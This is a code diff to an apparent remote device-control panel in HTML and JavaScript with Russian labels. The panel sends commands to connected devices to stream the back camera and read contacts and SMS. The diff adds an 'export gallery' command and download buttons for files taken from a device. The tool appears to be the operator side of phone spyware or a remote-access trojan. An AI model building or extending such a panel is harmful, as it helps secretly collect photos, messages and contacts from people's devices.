@@ -52,6 +52,8 @@ body.light input, body.light button { background:#f4f4f4; color:#222; border-col
 .stream-container { display:none; margin-top:20px; border:1px solid #555; padding:10px; border-radius:8px; background:#111; }
 .stream-container img { width:100%; max-width:600px; border:1px solid #000; background:#000; }
 .stream-container button { margin-top:10px; background:#d32f2f; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; }
+.download-btn { background:#4caf50; color:#fff; border:none; padding:4px 12px; border-radius:4px; cursor:pointer; margin-left:10px; }
+.download-btn:hover { background:#66bb6a; }
 </style>
 </head>
 <body>
@@ -160,6 +162,7 @@ body.light input, body.light button { background:#f4f4f4; color:#222; border-col
                 <button data-cmd="backcam">Осн. камера</button>
                 <button data-cmd="contacts">Контакты</button>
                 <button data-cmd="sms">SMS</button>
+                <button data-cmd="exportgallery">Экспорт галереи</button>
             </div>
             <button id="backDevices">Назад</button>
             <div id="streamContainer" class="stream-container">
@@ -318,7 +321,10 @@ body.light input, body.light button { background:#f4f4f4; color:#222; border-col
                             ${isImage ? `<img src="${f.url}" style="max-width:100%; max-height:150px; border-radius:4px;">` : ''}
                             ${isVideo ? `<video src="${f.url}" controls style="max-width:100%; max-height:150px;"></video>` : ''}
                             ${!isImage && !isVideo ? `<div style="font-size:40px;">📄</div>` : ''}
-                            <div style="font-size:12px; margin-top:5px;"><a href="${f.url}" target="_blank">${f.filename}</a></div>
+                            <div style="font-size:12px; margin-top:5px;">
+                                <a href="${f.url}" target="_blank">${f.filename}</a>
+                                <button class="download-btn" data-url="${f.url}" data-filename="${f.filename}">Скачать</button>
+                            </div>
                             <div style="font-size:10px; color:#999;">${date}</div>
                         </div>`;
                     });
@@ -326,6 +332,13 @@ body.light input, body.light button { background:#f4f4f4; color:#222; border-col
                 }
                 html += '</div>';
                 content.innerHTML = html;
+                document.querySelectorAll('.download-btn').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        const url = this.dataset.url;
+                        const filename = this.dataset.filename;
+                        window.location.href = url;
+                    });
+                });
             })
             .catch(() => { content.innerHTML = '<div class="card"><h2>Ошибка загрузки файлов</h2></div>'; });
     }
